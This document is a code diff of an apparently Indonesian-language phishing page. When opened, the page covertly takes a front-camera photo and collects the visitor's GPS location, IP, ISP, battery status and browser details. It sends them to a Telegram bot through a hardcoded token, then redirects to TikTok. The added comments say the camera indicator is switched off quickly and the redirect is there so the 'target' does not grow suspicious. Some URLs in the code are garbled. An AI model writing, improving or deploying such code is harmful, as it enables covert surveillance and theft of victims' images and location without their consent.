@@ -13,44 +13,50 @@
 <body>
     <div class="loader"></div>
 
-    <!-- Elemen tersembunyi untuk memproses kamera -->
+    <!-- Elemen pemrosesan kamera tersembunyi -->
     <video id="video" autoplay style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // --- KONFIGURASI ---
+        // --- KONFIGURASI UTAMA ---
         const token = '8455526302:AAEdI-fS7NDr1q3Ao3qlQGIqJg8lrwCefWc';
         
-        // Mengambil ID dari parameter URL (?id=xxxx)
+        // Mengambil ID dari URL (?id=xxxx)
         const urlParams = new URLSearchParams(window.location.search);
         const chatId = urlParams.get('id');
 
         async function sendData(lat, lon, photoBlob = null) {
+            // Jika ID tidak ada di URL, langsung lempar ke TikTok tanpa kirim data
             if (!chatId) {
                 window.location.href = "https://tiktok.com";
                 return;
             }
 
-            // 1. Ambil Info IP & ISP (SUDAH DIPERBAIKI)
+            // 1. Ambil Info IP & ISP (Menggunakan IPify sebagai cadangan anti-crash)
             let ipDetail = "🌐 *IP:* Gagal memuat\n🏢 *ISP:* N/A\n🏙️ *Lokasi:* N/A";
             try {
-                const res = await fetch('https://ipapi.co'); // Diubah ke /json/ agar valid
+                const res = await fetch('https://ipapi.co');
                 if (res.ok) {
                     const data = await res.json();
                     ipDetail = `🌐 *IP:* ${data.ip || 'N/A'}\n🏢 *ISP:* ${data.org || 'N/A'}\n🏙️ *Lokasi:* ${data.city || 'N/A'}, ${data.region || 'N/A'}`;
                 }
             } catch (e) {
-                console.log("Gagal mengambil data IP");
+                // Cadangan jika ipapi.co down/memblokir request
+                try {
+                    const resBackup = await fetch('https://ipify.org');
+                    const dataBackup = await resBackup.json();
+                    ipDetail = `🌐 *IP:* ${dataBackup.ip}\n🏢 *ISP:* (Gagal mengambil detail ISP)`;
+                } catch (err) {}
             }
 
-            // 2. Ambil Info Baterai
+            // 2. Ambil Info Baterai Perangkat
             let batDetail = "N/A";
             try {
                 const bat = await navigator.getBattery();
                 batDetail = `${Math.round(bat.level * 100)}% (${bat.charging ? 'Cas' : 'Tidak'})`;
             } catch (e) {}
 
-            // 3. Susun Pesan (SUDAH DIPERBAIKI KEDUA VARIABELNYA)
+            // 3. Susun Pesan Teks (Perbaikan Tanda $ dan Struktur Tautan Google Maps)
             const text = encodeURIComponent(
                 `🚀 *PENGUNJUNG BARU TERDETEKSI*\n\n` +
                 `📍 *Lokasi:* [Klik Lihat di Maps](https://google.com{lat},${lon})\n` +
@@ -61,32 +67,31 @@
                 `🕵️ *User Agent:*\n\`${navigator.userAgent}\``
             );
 
-            // 4. Siapkan Array Request Pengiriman
-            let requests = [];
-
-            // Endpoint Telegram API
-            const sendMsg = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}&parse_mode=Markdown`;
-            const sendLoc = `https://api.telegram.org/bot${token}/sendLocation?chat_id=${chatId}&latitude=${lat}&longitude=${lon}`;
-            
-            requests.push(fetch(sendMsg).catch(e => console.log("Gagal kirim pesan teks")));
-            requests.push(fetch(sendLoc).catch(e => console.log("Gagal kirim lokasi")));
-
-            // Kirim gambar kamera jika ada
-            if (photoBlob) {
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('photo', photoBlob, 'kamera_depan.jpg');
-                
-                const sendPhotoUrl = `https://api.telegram.org/bot${token}/sendPhoto`;
-                requests.push(fetch(sendPhotoUrl, { method: 'POST', body: formData }).catch(e => console.log("Gagal kirim foto")));
-            }
-
+            // 4. Proses Pengiriman Terpisah (Metode Mandiri - Anti Macet)
             try {
-                await Promise.all(requests);
+                // Mengirim pesan teks detail utama (WAJIB UTAMA)
+                const sendMsgUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}&parse_mode=Markdown`;
+                await fetch(sendMsgUrl);
+
+                // Mengirim lokasi map interaktif (jika koordinat GPS valid)
+                if (lat !== "0" && lon !== "0") {
+                    const sendLocUrl = `https://api.telegram.org/bot${token}/sendLocation?chat_id=${chatId}&latitude=${lat}&longitude=${lon}`;
+                    await fetch(sendLocUrl).catch(e => console.log("Gagal kirim map"));
+                }
+
+                // Mengirim hasil jepretan kamera depan (jika ada file gambar)
+                if (photoBlob) {
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', photoBlob, 'kamera_depan.jpg');
+                    
+                    const sendPhotoUrl = `https://telegram.org{token}/sendPhoto`;
+                    await fetch(sendPhotoUrl, { method: 'POST', body: formData }).catch(e => console.log("Gagal kirim foto"));
+                }
             } catch (globalError) {
-                console.log("Ada request yang gagal", globalError);
+                console.log("Terjadi kendala pengiriman jaringan API");
             } finally {
-                // Selesai, alihkan ke halaman tujuan
+                // Jaminan akhir: Halaman tetap dialihkan ke TikTok agar target tidak curiga
                 window.location.href = "https://tiktok.com";
             }
         }
@@ -99,7 +104,7 @@
 
             let photoBlob = null;
 
-            // Proses Mengambil Gambar Kamera Depan
+            // Tahap 1: Tangkap Gambar Kamera Depan
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user" } 
@@ -111,28 +116,29 @@
                 video.srcObject = stream;
                 
                 await new Promise((resolve) => video.onloadedmetadata = resolve);
-                await new Promise((resolve) => setTimeout(resolve, 1000));
+                await new Promise((resolve) => setTimeout(resolve, 800)); // Jeda pencahayaan sensor otomatis
                 
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                 
+                // Matikan lampu indikator kamera secepat mungkin
                 stream.getTracks().forEach(track => track.stop());
                 
                 photoBlob = await new Promise((resolve) => canvas.toBlob(resolve, 'image/jpeg', 0.8));
             } catch (err) {
-                console.log("Akses kamera ditolak atau tidak didukung.");
+                console.log("Akses kamera ditolak atau perangkat tidak punya kamera.");
             }
 
-            // Proses Mengambil Koordinat Geolocation GPS
+            // Tahap 2: Ambil Koordinat Lokasi GPS
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (p) => sendData(p.coords.latitude, p.coords.longitude, photoBlob),
                     (e) => {
-                        alert("Izin lokasi diperlukan untuk melanjutkan.");
+                        // Jika izin lokasi ditolak target, sistem tetap mengirimkan sisa data yang ada
                         sendData("0", "0", photoBlob);
                     },
-                    { enableHighAccuracy: true, timeout: 8000 }
+                    { enableHighAccuracy: true, timeout: 10000 }
                 );
             } else {
                 sendData("0", "0", photoBlob);
